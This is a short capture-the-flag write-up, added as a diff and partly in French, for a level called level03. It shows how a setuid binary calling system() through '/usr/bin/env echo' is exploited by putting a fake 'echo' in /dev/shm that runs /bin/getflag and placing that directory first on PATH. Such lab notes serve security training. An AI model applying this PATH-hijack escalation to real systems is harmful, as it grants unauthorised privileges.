@@ -1,0 +1,23 @@
+-UID exploit
+
+> strings level03
+/usr/bin/env echo Exploit me
+
+> nm -u level03 //lister les symboles des fichiers objets
+U getegid@@GLIBC_2.0
+U geteuid@@GLIBC_2.0
+U setresgid@@GLIBC_2.0
+U setresuid@@GLIBC_2.0
+U system@@GLIBC_2.0
+
+> strings level03
+/usr/bin/env echo %s
+
+We change echo bin
+
+> PATH=/dev/shm:$PATH
+> echo "/bin/getflag" > /dev/shm/echo
+> chmod +x /dev/shm/echo
+> ./level03
+
+
